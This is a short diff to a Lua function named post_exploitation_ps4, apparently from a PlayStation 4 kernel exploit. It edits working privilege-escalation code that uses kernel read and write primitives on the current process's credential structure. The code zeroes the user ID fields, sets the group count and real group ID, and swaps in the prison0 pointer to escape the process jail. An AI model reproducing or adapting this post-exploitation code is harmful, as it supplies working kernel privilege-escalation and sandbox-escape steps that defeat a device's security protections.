@@ -1732,17 +1732,11 @@ function post_exploitation_ps4()
         local proc_fd = kernel.read_qword(curproc + kernel_offset.PROC_FD)
         local ucred = kernel.read_qword(curproc + OFFSET_P_UCRED)
     
-        -- kernel.write_dword(p_ucred + 0x4, 0)
-        -- kernel.write_dword(p_ucred + 0x8, 0)
-        -- kernel.write_dword(p_ucred + 0xC, 0)
-        -- kernel.write_dword(p_ucred + 0x10, 0)
-        
         kernel.write_dword(ucred + 0x04, 0) -- cr_uid
         kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
         kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
-        kernel.write_dword(ucred + 0x10, 0) -- cr_ngroups
-        -- kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
-        -- kernel.write_dword(ucred + 0x14, 0) -- cr_rgid
+        kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
+        kernel.write_dword(ucred + 0x14, 0) -- cr_rgid
     
         local prison0 = kernel.read_qword(PRISON0)
         kernel.write_qword(ucred + 0x30, prison0)
